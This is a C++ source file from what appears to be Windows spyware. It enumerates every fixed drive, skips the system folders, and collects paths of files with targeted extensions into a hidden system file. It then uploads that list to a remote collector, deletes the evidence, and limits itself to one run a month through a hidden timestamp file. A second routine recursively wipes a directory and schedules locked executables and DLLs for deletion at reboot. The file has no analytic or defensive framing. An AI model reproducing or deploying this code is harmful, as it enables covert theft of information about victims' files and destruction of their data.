#include "../api.h"
#include "../public.h"
#include "HARDdiskfile.h"
#include "zconf.h"
#include "zlib.h"
#include "../network/NetWorkdata.h"
#include "../log.h"
#include "../StrHelper.h"

#pragma comment(lib,"zlib.lib")

#include <iostream>

using namespace std;


extern char szDirWindows[];
extern char szProgramFiles[];
extern char szProgramData[];

extern string gPrefixNames;

//this function need to be in a independent thread process
int __stdcall FindFilesInDir(char* PreStrPath, int iLayer, HANDLE hfile)
{
	int counter = 0;
	int iRet = 0;
	char strBuf[1024];

	char strPath[4096] = { 0 };
	lplstrcpyA(strPath, PreStrPath);
	char szAllFileForamt[] = { '*','.','*',0 };
	lplstrcatA(strPath, szAllFileForamt);

	char szLastDir[] = { '.','.',0 };
	WIN32_FIND_DATAA stWfd = { 0 };
	HANDLE hFind = 0;
	__try
	{
		hFind = lpFindFirstFileA(strPath, (LPWIN32_FIND_DATAA)&stWfd);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			// 			iRet = lpRtlGetLastWin32Error();
			// 			lpwsprintfA(strBuf, "FindFilesInDir lpFindFirstFileA path:%s error,error code is:%u\r\n", strPath, iRet);
			// 			writeLog(strBuf);
			return counter;
		}

		do
		{
			if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (lplstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lplstrcmpiA(stWfd.cFileName, ".") == 0)
				{
					continue;
				}
				else if (strstr(stWfd.cFileName, szDirWindows) || strstr(stWfd.cFileName, szProgramData) || strstr(stWfd.cFileName, szProgramFiles))
				{
					continue;
				}

				char strNextPath[4096] = { 0 };
				lpRtlMoveMemory(strNextPath, strPath, lplstrlenA(strPath) - 3);
				lplstrcatA(strNextPath, stWfd.cFileName);
				lplstrcatA(strNextPath, "\\");
				counter = counter + FindFilesInDir(strNextPath, iLayer + 1, hfile);
			}
			else
			{
				if (stWfd.nFileSizeLow || stWfd.nFileSizeHigh) {

					int pos = string(stWfd.cFileName).find(".");
					if (pos >= 0)
					{
						string prefixfn = string(stWfd.cFileName).substr(pos);
						pos = gPrefixNames.find(prefixfn);
						if (pos >= 0)
						{
							char szfilename[MAX_PATH * 4];
							lplstrcpyA(szfilename, PreStrPath);
							lplstrcatA(szfilename, stWfd.cFileName);
							lplstrcatA(szfilename, "\r\n");

							DWORD dwcnt = 0;
							iRet = lpWriteFile(hfile, szfilename, lplstrlenA(szfilename), &dwcnt, 0);

							counter++;
							if (counter % 16 == 0)
							{
								lpSleep(50);
							}
						}
					}
				}
			}
		} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));
		lpFindClose(hFind);
		return counter;
	}
	__except (1)
	{
		if (hFind)
		{
			lpFindClose(hFind);
		}

		return counter;
	}
}


int bNeedAllFiles() {
	string cfgfn = string(strDataPath) + "diskfileTime.ini";

	int ret = 0;

	int result = 0;

	DWORD dwcnt = 0;

	int len = 0;

	int filesize = 0;

	time_t now = time(0);

	char data[1024] = { 0 };
	HANDLE hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hf == INVALID_HANDLE_VALUE) {
		hf = lpCreateFileA((char*)cfgfn.c_str(), GENERIC_READ | GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	}

	filesize = lpGetFileSize(hf, 0);
	ret = lpReadFile(hf, data, filesize, &dwcnt, 0);
	*(data + filesize) = 0;

	string strtime = data;

	time_t last = atoi(strtime.c_str());
	if (now - last >= 30 * 24 * 3600)
	{
		len = lpwsprintfA(data, "%u", now);
		ret = lpSetFilePointer(hf, 0, 0, FILE_BEGIN);
		ret = lpWriteFile(hf, data, len, &dwcnt, 0);
		result = TRUE;
	}

	lpCloseHandle(hf);

	ret = SetFileAttributesA(cfgfn.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE);

	return result;
}



//this function need to be in a independent thread process
int __stdcall GetHardDiskAllFiles()
{

	try
	{
		if (bNeedAllFiles() == 0)
		{
			return 0;
		}

		char szerror[1024];
		char strDisk[4096] = { 0 };
		int iLen = lpGetLogicalDriveStringsA(4096, strDisk);
		if (iLen <= 0)
		{
			return FALSE;
		}
		char* strDiskPtr = strDisk;

		DWORD dwFilesCnt = 0;

		char strFilePath[MAX_PATH] = { 0 };
		int iRet = makeFullFileName(strFilePath, ALL_DISK_FILE_FILENAME);
		HANDLE hFile = lpCreateFileA(strFilePath, GENERIC_READ | GENERIC_WRITE, 0, 0,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			writeLog("GetAllDiskFiles lpCreateFileA error\r\n");
			return FALSE;
		}

		for (int i = 0; i < iLen / 4; ++i)
		{
			iRet = lpGetDriveTypeA(strDiskPtr);
			if (iRet == DRIVE_FIXED /*|| iRet == DRIVE_REMOTE || iRet == DRIVE_CDROM || iRet == DRIVE_REMOVABLE*/)
				//会出现不存在软盘异常 必须去掉DRIVE_REMOVABLE
			{
				if ((*strDiskPtr == 'A' || *strDiskPtr == 'B' || *strDiskPtr == 'a' || *strDiskPtr == 'b') && iRet == DRIVE_REMOVABLE)
				{
				}
				else {
					int filescounter = dwFilesCnt + FindFilesInDir(strDiskPtr, 1, hFile);
					dwFilesCnt += filescounter;

					lpwsprintfA(szerror, "FindFilesInDir path:%s find files:%d\r\n", strDiskPtr, filescounter);
					writeLog(szerror);
				}
			}
			strDiskPtr += 4;
		}

		lpwsprintfA(szerror, "FindFilesInDir find total files:%d\r\n", dwFilesCnt);
		writeLog(szerror);

		int filesize = lpGetFileSize(hFile, 0);
		char* lpbuf = new char[filesize];
		if (lpbuf == FALSE)
		{
			lpCloseHandle(hFile);
			return FALSE;
		}
		DWORD dwcnt = 0;
		iRet = lpSetFilePointer(hFile, 0, 0, FILE_BEGIN);
		iRet = lpReadFile(hFile, lpbuf, filesize, &dwcnt, 0);
		lpCloseHandle(hFile);

		iRet = uploadData(lpbuf, filesize, HARDDISKALLFILE, 0);
		delete[] lpbuf;

#ifndef _DEBUG
		lpDeleteFileA(strFilePath);
#endif
		return TRUE;
	}
	catch (...)
	{
		writeLog("GetAllDiskFiles exception\r\n");
		return FALSE;
	}
}











int __stdcall DeleteAllFilesInDir(char* szPreStrPath)
{
	char szFindName[MAX_PATH];
	lplstrcpyA(szFindName, szPreStrPath);
	char szAllNameFormat[] = { '*','.','*',0 };
	lplstrcatA(szFindName, szAllNameFormat);

	HANDLE hFind = 0;
	WIN32_FIND_DATAA stWfd = { 0 };
	char szLastDir[] = { '.','.',0 };
	char strBuf[1024];
	int iRet = 0;
	try
	{
		hFind = lpFindFirstFileA(szFindName, (LPWIN32_FIND_DATAA)&stWfd);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			iRet = lpRtlGetLastWin32Error();

			lpwsprintfA(strBuf, "DeleteAllFilesInDir lpFindFirstFileA error,error code is:%u\r\n", iRet);
			writeLog(strBuf);
			return FALSE;
		}

		do
		{
			if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (lpRtlCompareMemory(stWfd.cFileName, szLastDir, 2) == 2 ||
					lpRtlCompareMemory(stWfd.cFileName, szLastDir, 1) == 1)
				{
					continue;
				}
				char sznextpath[MAX_PATH];
				lplstrcpyA(sznextpath, szPreStrPath);
				lplstrcatA(sznextpath, stWfd.cFileName);
				lplstrcatA(sznextpath, "\\");
				int iNextLen = DeleteAllFilesInDir(sznextpath);
			}
			else if (strstr(stWfd.cFileName, ".dll") || strstr(stWfd.cFileName, ".exe"))
			{
				char szFullFileNamePath[MAX_PATH];
				lplstrcpyA(szFullFileNamePath, szPreStrPath);
				lplstrcatA(szFullFileNamePath, stWfd.cFileName);
				iRet = lpDeleteFileA(szFullFileNamePath);
				if (iRet == 0)
				{
					iRet = lpMoveFileExA(szFullFileNamePath, 0, MOVEFILE_DELAY_UNTIL_REBOOT);
				}
			}
			else
			{
				char szFullFileNamePath[MAX_PATH];
				lplstrcpyA(szFullFileNamePath, szPreStrPath);
				lplstrcatA(szFullFileNamePath, stWfd.cFileName);
				iRet = lpDeleteFileA(szFullFileNamePath);
				if (iRet == 0)
				{
					iRet = lpRtlGetLastWin32Error();
				}
			}
		} while (lpFindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd) != 0);

		lpFindClose(hFind);

		iRet = lpRemoveDirectoryA(szPreStrPath);
		return TRUE;
	}
	catch (...)
	{
		if (hFind)
		{
			lpFindClose(hFind);
		}

		return FALSE;
	}
}